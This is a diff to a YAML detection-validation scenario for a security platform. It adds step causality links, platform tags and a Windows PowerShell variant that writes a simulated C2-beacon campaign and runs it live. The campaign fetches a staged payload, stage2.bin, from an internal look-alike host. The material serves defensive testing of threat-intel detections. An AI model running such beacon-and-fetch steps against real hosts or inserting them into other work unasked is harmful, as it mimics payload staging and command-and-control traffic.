@@ -51,6 +51,19 @@ external_tools:
     type: script
     install_inline: false
 
+# ── Causality contract ──────────────────────────────────────────────────────
+# Defender-vantage TIM scenario: the estate host's outbound-reaching process is
+# the EAL beacon/loader harness (python3), NOT the cortexsim beacon node — that
+# is the Causality Group Owner XDR/NGFW would attribute the DNS resolution +
+# staged-payload fetch to. The steps run in one operator session on one host:
+# feed pre-flight → dry-run safety gate → live resolve+fetch, each sharing the
+# same estate host (shared_entity on src_host, the scenario's stitching_key). The
+# feed-match / DNS / NGFW-session legs then stitch on that host into one
+# Resource-Development incident (CR-TIM-0002, correlation_window_seconds: 300).
+cgo_anchor:
+  image_name: "python3"
+  primary_username: "container-runtime"
+
 steps:
   - id: step-01
     name: "Confirm mocktaxii Resource-Development indicators (look-alike domains, staged-payload hash, C2 IP) are ingested"
@@ -65,6 +78,7 @@ steps:
         description: "Pre-flight: the mocktaxii Resource-Development indicator set (domain/ipv4/sha256) is ingested into the XSIAM threat_intel dataset"
         ttp_ref: "TTP-2026-0079"
         detection_id: xql-tim-002-pre-flight-resource-development-indicators-ingested-into-threat-intel
+    platforms: ["linux", "container"]
 
   - id: step-02
     name: "Dry-run staging fetch — confirm safety policy holds before generating IOC traffic"
@@ -96,6 +110,10 @@ steps:
         description: "Dry-run: no Resource-Development IOC match fires (safety policy active, no live resolution/fetch)"
         ttp_ref: "TTP-2026-0079"
         detection_id: xql-tim-002-newly-registered-look-alike-domain-resolution-surfaced-ndr-dns-leg
+    causality:
+      parent_step: step-01
+      pivot: shared_entity
+    platforms: ["linux", "container"]
 
   - id: step-03
     name: "Live resolve + fetch from TAXII-fed staged-capability host — fire IOC match + DNS leg + session + stitch"
@@ -166,6 +184,34 @@ steps:
         description: "Stitch validation — Resource-Development feed match joined to resolution and session on source host"
         ttp_ref: "TTP-2026-0079"
         detection_id: xql-tim-002-stitch-resource-development-feed-match-joined-to-resolution-and-session-on-source-host
+    causality:
+      parent_step: step-02
+      pivot: shared_entity
+    platforms: ["linux", "container", "windows"]
+    platform_variants:
+      windows: |
+        $env:TIM_ZONE = 'cortexsim-tim.internal'
+        @'
+        campaign_id: CMP-TIM-002
+        name: "TIM validation — adversary infrastructure staging live fetch"
+        authorized_by: "domain-consultant@paloaltonetworks.com"
+        simulation_authorized: true
+        target_allowlist:
+          - payload-delivery.cortexsim-tim.internal
+          - dga-1a2b3c.cortexsim-tim.internal
+        dry_run: false
+        steps:
+          - step_id: step-01
+            plugin: c2_http_beacon
+            params:
+              target_url: http://payload-delivery.cortexsim-tim.internal:8000/stage2.bin
+              iterations: 3
+              sleep_seconds: 5
+              jitter_pct: 10
+              method: GET
+              dga_query_param: false
+        '@ | Set-Content -Encoding utf8 $env:TEMP\tim-resdev-stage-live.yml
+        python -m scripts.eal_simulator.cli run $env:TEMP\tim-resdev-stage-live.yml --live
 
 cleanup:
   commands:
